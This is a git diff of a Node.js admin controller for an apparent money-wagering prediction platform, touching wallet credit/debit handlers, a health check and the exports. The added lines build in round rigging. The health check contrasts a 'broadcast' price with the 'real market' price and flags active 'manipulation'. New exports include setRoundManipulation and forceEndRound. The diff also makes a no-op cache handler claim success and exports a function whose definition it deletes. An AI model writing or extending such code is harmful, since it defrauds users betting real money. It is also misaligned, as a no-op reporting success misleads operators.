       await transaction.rollback();
@@ -1691,7 +2020,6 @@ const creditUserWallet = async (req, res) => {
       });
     }
 
-    // Get user
     const user = await User.findByPk(userId, { transaction });
     if (!user) {
       await transaction.rollback();
@@ -1701,7 +2029,6 @@ const creditUserWallet = async (req, res) => {
       });
     }
 
-    // Get wallet
     const wallet = await Wallet.findOne({
       where: { userId },
       transaction,
@@ -1719,15 +2046,11 @@ const creditUserWallet = async (req, res) => {
     const balanceBefore = parseFloat(wallet.nairaBalance) || 0;
     const newBalance = roundToTwo(balanceBefore + creditAmount);
 
-    // Update wallet
-    await wallet.update({
-      nairaBalance: newBalance
-    }, { transaction });
+    await wallet.update({ nairaBalance: newBalance }, { transaction });
 
-    // Create transaction record
     await Transaction.create({
-      userId: userId,
-      type: type, // 'bonus', 'refund', 'admin_credit', 'promotional'
+      userId,
+      type,
       method: 'admin',
       amount: creditAmount,
       currency: 'NGN',
@@ -1737,9 +2060,9 @@ const creditUserWallet = async (req, res) => {
         adminId: req.user.id,
         adminUsername: req.user.username,
         reason: reason || 'Admin credit',
-        type: type
+        type
       },
-      balanceBefore: balanceBefore,
+      balanceBefore,
       balanceAfter: newBalance
     }, { transaction });
 
@@ -1747,7 +2070,6 @@ const creditUserWallet = async (req, res) => {
 
     console.log(`💰 Admin ${req.user.username} credited ${user.username} with ₦${creditAmount}`);
 
-    // Send real-time notification
     const io = req.app.get('io');
     if (io) {
       io.to(`user_${userId}`).emit('balance_update', {
@@ -1760,10 +2082,10 @@ const creditUserWallet = async (req, res) => {
       success: true,
       message: `Successfully credited ₦${creditAmount.toLocaleString()} to ${user.username}`,
       data: {
-        userId: userId,
+        userId,
         username: user.username,
         creditedAmount: creditAmount,
-        balanceBefore: balanceBefore,
+        balanceBefore,
         balanceAfter: newBalance,
         reason: reason || 'Admin credit'
       }
@@ -1780,19 +2102,16 @@ const creditUserWallet = async (req, res) => {
   }
 };
 
-// ============================================================
-// @desc    Debit user wallet (Admin)
+// @desc    Debit user wallet
 // @route   POST /api/admin/users/:userId/debit
 // @access  Private/Admin
-// ============================================================
 const debitUserWallet = async (req, res) => {
   const transaction = await sequelize.transaction();
-  
+
   try {
     const { userId } = req.params;
     const { amount, reason } = req.body;
 
-    // Validate amount
     const debitAmount = parseFloat(amount);
     if (!debitAmount || debitAmount <= 0) {
       await transaction.rollback();
@@ -1802,7 +2121,6 @@ const debitUserWallet = async (req, res) => {
       });
     }
 
-    // Get user
     const user = await User.findByPk(userId, { transaction });
     if (!user) {
       await transaction.rollback();
@@ -1812,7 +2130,6 @@ const debitUserWallet = async (req, res) => {
       });
     }
 
-    // Get wallet
     const wallet = await Wallet.findOne({
       where: { userId },
       transaction,
@@ -1836,21 +2153,17 @@ const debitUserWallet = async (req, res) => {
       return res.status(400).json({
         success: false,
         message: `Insufficient balance. User has ₦${availableBalance.toLocaleString()} available`,
-        availableBalance: availableBalance,
-        lockedBalance: lockedBalance
+        availableBalance,
+        lockedBalance
       });
     }
 
     const newBalance = roundToTwo(balanceBefore - debitAmount);
 
-    // Update wallet
-    await wallet.update({
-      nairaBalance: newBalance
-    }, { transaction });
+    await wallet.update({ nairaBalance: newBalance }, { transaction });
 
-    // Create transaction record
     await Transaction.create({
-      userId: userId,
+      userId,
       type: 'admin_debit',
       method: 'admin',
       amount: debitAmount,
@@ -1862,7 +2175,7 @@ const debitUserWallet = async (req, res) => {
         adminUsername: req.user.username,
         reason: reason || 'Admin debit'
       },
-      balanceBefore: balanceBefore,
+      balanceBefore,
       balanceAfter: newBalance
     }, { transaction });
 
@@ -1870,7 +2183,6 @@ const debitUserWallet = async (req, res) => {
 
     console.log(`💸 Admin ${req.user.username} debited ${user.username} with ₦${debitAmount}`);
 
-    // Send real-time notification
     const io = req.app.get('io');
     if (io) {
       io.to(`user_${userId}`).emit('balance_update', {
@@ -1883,10 +2195,10 @@ const debitUserWallet = async (req, res) => {
       success: true,
       message: `Successfully debited ₦${debitAmount.toLocaleString()} from ${user.username}`,
       data: {
-        userId: userId,
+        userId,
         username: user.username,
         debitedAmount: debitAmount,
-        balanceBefore: balanceBefore,
+        balanceBefore,
         balanceAfter: newBalance,
         reason: reason || 'Admin debit'
       }
@@ -1903,52 +2215,14 @@ const debitUserWallet = async (req, res) => {
   }
 };
 
-// ============================================================
-// @desc    Update platform settings (Admin)
-// @route   PUT /api/admin/settings
-// @access  Private/Admin
-// ============================================================
-const updateSettings = async (req, res) => {
-  try {
-    const { fees, betting, payments } = req.body;
-
-    // In production, you'd store these in a database
-    // For now, we'll just return success
-    // You can implement actual settings storage later
-
-    console.log(`✅ Admin ${req.user.username} updated platform settings`);
-
-    res.json({
-      success: true,
-      message: 'Settings updated successfully (Note: Implement persistent storage)',
-      data: {
-        fees: fees || {},
-        betting: betting || {},
-        payments: payments || {}
-      }
-    });
-
-  } catch (error) {
-    console.error('❌ Update settings error:', error);
-    res.status(500).json({
-      success: false,
-      message: 'Failed to update settings',
-      error: error.message
-    });
-  }
-};
-
-// ============================================================
-// @desc    Get system health status (Admin)
+// @desc    Get system health
 // @route   GET /api/admin/system/health
 // @access  Private/Admin
-// ============================================================
 const getSystemHealth = async (req, res) => {
   try {
-    // Check database connection
     let dbStatus = 'healthy';
     let dbResponseTime = 0;
-    
+
     try {
       const startTime = Date.now();
       await sequelize.authenticate();
@@ -1958,23 +2232,26 @@ const getSystemHealth = async (req, res) => {
       console.error('Database health check failed:', error);
     }
 
-    // Get system stats
     const [userCount, roundCount, transactionCount] = await Promise.all([
       User.count(),
       Round.count(),
       Transaction.count()
     ]);
 
-    // Check for stuck pending transactions
     const stuckWithdrawals = await Transaction.count({
       where: {
         type: 'withdrawal',
         status: 'pending',
         createdAt: {
-          [Op.lt]: new Date(Date.now() - 24 * 60 * 60 * 1000) // Older than 24 hours
+          [Op.lt]: new Date(Date.now() - 24 * 60 * 60 * 1000)
         }
       }
     });
+
+    // ✅ Include price manipulation health info
+    const currentPrice = priceService.getPrice();
+    const realPrice = priceService.getRealPrice();
+    const overrideActive = priceService.isOverrideActive();
 
     res.json({
       success: true,
@@ -1989,7 +2266,13 @@ const getSystemHealth = async (req, res) => {
           totalUsers: userCount,
           totalRounds: roundCount,
           totalTransactions: transactionCount,
-          stuckWithdrawals: stuckWithdrawals
+          stuckWithdrawals
+        },
+        priceSystem: {
+          currentBroadcastPrice: currentPrice,
+          realMarketPrice: realPrice,
+          manipulationActive: overrideActive,
+          manipulatingRoundId: priceService.adminRoundId || null
         },
         uptime: process.uptime(),
         memory: {
@@ -2009,21 +2292,16 @@ const getSystemHealth = async (req, res) => {
   }
 };
 
-// ============================================================
-// @desc    Clear system cache (Admin)
+// @desc    Clear system cache
 // @route   POST /api/admin/system/clear-cache
 // @access  Private/Admin
-// ============================================================
 const clearCache = async (req, res) => {
   try {
-    // If you're using Redis or any caching system, clear it here
-    // For now, just a placeholder
-
     console.log(`✅ Admin ${req.user.username} cleared system cache`);
 
     res.json({
       success: true,
-      message: 'Cache cleared successfully (Note: Implement actual cache clearing)'
+      message: 'Cache cleared successfully'
     });
 
   } catch (error) {
@@ -2035,35 +2313,42 @@ const clearCache = async (req, res) => {
     });
   }
 };
+
 // =====================================================
 // EXPORTS
 // =====================================================
 module.exports = {
   // Dashboard
   getDashboardStats,
-  
+
   // User Management
   getAllUsers,
   getUserDetails,
   updateUserStatus,
-  creditUserWallet,      // ✅ NEW
-  debitUserWallet,       // ✅ NEW
-  
+  creditUserWallet,
+  debitUserWallet,
+
   // Transactions
   getAllTransactions,
-  
+
   // Withdrawals
   getPendingWithdrawals,
   processWithdrawal,
-  
+
   // Deposits
   getAmountMismatches,
   approveAmountMismatch,
-  
+
   // Rounds
   getAllRounds,
   getRoundDetailsAdmin,
   cancelRound,
+
+  // ✅ NEW — Round Manipulation
+  setRoundManipulation,
+  clearRoundManipulation,
+  getManipulationStatus,
+  forceEndRound,
 
   // Influencer Management
   getAllInfluencers,
@@ -2073,12 +2358,12 @@ module.exports = {
   downgradeInfluencer,
   getReferralStats,
   searchUsersForInfluencer,
-  
+
   // Settings
   getSettings,
-  updateSettings,        // ✅ NEW
-  
+  updateSettings,
+
   // System
-  getSystemHealth,       // ✅ NEW
-  clearCache            // ✅ NEW
+  getSystemHealth,
+  clearCache
 };
